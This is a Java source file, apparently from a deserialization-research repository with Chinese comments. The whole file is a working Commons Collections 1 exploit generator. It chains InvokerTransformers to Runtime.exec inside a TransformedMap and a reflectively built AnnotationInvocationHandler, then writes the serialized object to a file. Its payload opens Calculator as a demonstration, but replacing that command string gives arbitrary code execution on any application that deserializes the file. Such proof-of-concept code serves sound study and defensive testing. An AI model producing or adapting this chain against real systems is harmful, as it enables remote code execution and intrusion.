package org.su18.serialize.ysoserial.CommonCollections.CommonCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import javax.annotation.Generated;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollections 1 链
 *
 * @author su18
 */
public class CC1WithTransformedMap {

	public static void main(String[] args) throws Exception {

		Map hashMap = new HashMap();
		// 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
		// 并且这里的值的一定不是属性值的类型
		hashMap.put("comments", 2);

		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
		});


		Map      transformedMap = TransformedMap.decorate(hashMap, null, chain);
		Class<?> c              = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);

		SerializeUtil.writeObjectToFile(handler);
//		SerializeUtil.readFileObject();
	}
}
